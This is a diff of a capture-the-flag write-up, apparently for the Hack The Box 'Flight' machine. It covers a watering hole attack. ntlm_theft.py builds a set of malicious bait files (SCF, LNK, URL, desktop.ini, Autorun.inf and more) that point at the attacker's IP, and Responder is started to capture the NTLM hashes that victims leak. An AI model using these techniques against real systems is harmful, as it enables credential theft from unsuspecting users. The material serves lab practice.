@@ -406,10 +406,10 @@ As previously identified there is nothing in the `shared` share so im going to t
 
 # Watering hole attack
 ```python
-python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
+python3 ntlm_theft.py -g all -s 10.10.14.90 -f meeting   
 /home/kali/htb/flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
   location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
-Skipping SCF as it does not work on modern Windows
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
 Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
 Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
 Created: meeting/meeting.lnk (BROWSE TO FOLDER)
@@ -428,14 +428,23 @@ Created: meeting/meeting.asx (OPEN)
 Created: meeting/meeting.jnlp (OPEN)
 Created: meeting/meeting.application (DOWNLOAD AND OPEN)
 Created: meeting/meeting.pdf (OPEN AND ALLOW)
-Skipping zoom as it does not work on the latest versions
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
 Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
-Skipping Autorun.inf as it does not work on modern Windows
-Skipping desktop.ini as it does not work on modern Windows
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
 Created: meeting/meeting.theme (THEME TO INSTALL
 Generation Complete.
 ```
 First i generate a malicious collection of file that will link back to me
+
+```python
+sudo responder -I tun0
+```
+Then ill start the listener
+
+```python
+
+```
 
 ```python
 
